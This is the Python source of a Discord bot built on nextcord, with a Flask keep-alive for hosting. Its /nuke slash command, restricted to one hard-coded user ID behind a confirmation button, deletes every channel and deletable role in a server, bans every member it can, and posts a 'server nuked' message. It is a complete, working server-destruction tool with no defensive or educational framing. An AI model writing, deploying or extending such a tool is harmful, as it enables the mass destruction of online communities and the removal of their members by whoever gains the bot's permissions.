# bot.py
import os
import threading
import asyncio
import nextcord
from nextcord.ext import commands
from nextcord.ui import View, Button
from nextcord import Interaction
from flask import Flask

# ----------------------
# CONFIG
# ----------------------
AUTHORIZED_USER = 1355140133661184221  # Only this user can use /nuke
TOKEN = os.environ.get("TOKEN")
PORT = int(os.environ.get("PORT", 10000))

if not TOKEN:
    raise RuntimeError("Missing TOKEN environment variable")

# ----------------------
# FLASK KEEP-ALIVE (Render)
# ----------------------
app = Flask("")

@app.route("/")
def home():
    return "Bot is running!"

def run_flask():
    app.run(host="0.0.0.0", port=PORT)

threading.Thread(target=run_flask, daemon=True).start()

# ----------------------
# NEXTCORD BOT
# ----------------------
intents = nextcord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
    print(f"Bot logged in as {bot.user}")

    try:
        synced = await bot.sync_application_commands()
        print(f"Slash commands synced: {len(synced)}")
    except Exception as e:
        print("Slash command sync error:", e)

# ----------------------
# CONFIRMATION BUTTON VIEW
# ----------------------
class ConfirmNuke(View):
    def __init__(self, user_id):
        super().__init__(timeout=60)
        self.user_id = user_id
        self.result = None

    async def interaction_check(self, interaction: Interaction):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("You cannot use these buttons.", ephemeral=True)
            return False
        return True

    @nextcord.ui.button(label="CONFIRM NUKE", style=nextcord.ButtonStyle.danger)
    async def confirm(self, button, interaction: Interaction):
        self.result = True
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(content="💥 Nuke confirmed! Starting...", view=self)
        self.stop()

    @nextcord.ui.button(label="CANCEL", style=nextcord.ButtonStyle.secondary)
    async def cancel(self, button, interaction: Interaction):
        self.result = False
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(content="❌ Cancelled.", view=self)
        self.stop()


# ----------------------
# /NUKE COMMAND
# ----------------------
@bot.slash_command(name="nuke", description="Deletes all channels, roles, and bans everyone.")
async def nuke(interaction: Interaction):

    # Check if authorized user
    if interaction.user.id != AUTHORIZED_USER:
        await interaction.response.send_message("❌ You cannot use this command.", ephemeral=True)
        return

    view = ConfirmNuke(interaction.user.id)

    await interaction.response.send_message(
        "⚠️ **WARNING** — This will delete all channels, deletable roles, and ban all possible members.\n"
        "Press **CONFIRM NUKE** to continue.",
        view=view,
        ephemeral=True
    )

    await view.wait()

    if not view.result:
        await interaction.followup.send("Nuke cancelled.", ephemeral=True)
        return

    guild = interaction.guild
    bot_member = guild.get_member(bot.user.id)

    # ----------------------
    # DELETE CHANNELS
    # ----------------------
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="Nuked")
            await asyncio.sleep(0.2)
        except:
            pass

    # ----------------------
    # DELETE ROLES
    # ----------------------
    for role in list(guild.roles):
        try:
            if role.is_default():
                continue
            if role.managed:
                continue
            if role.position >= bot_member.top_role.position:
                continue
            await role.delete(reason="Nuked")
            await asyncio.sleep(0.15)
        except:
            pass

    # ----------------------
    # BAN MEMBERS  (UPDATED)
    # ----------------------
    for member in list(guild.members):
        try:
            if member.id == AUTHORIZED_USER or member.id == bot.user.id:
                continue
            await guild.ban(member, reason="Nuked", delete_message_days=0)
            await asyncio.sleep(0.25)
        except:
            pass

    # ----------------------
    # Create final channel
    # ----------------------
    try:
        ch = await guild.create_text_channel("server-nuked")
        await ch.send("💥 Server nuked successfully.")
    except:
        pass

    await interaction.followup.send("🔥 Nuke completed.", ephemeral=True)


# ----------------------
# RUN BOT
# ----------------------
bot.run(TOKEN)
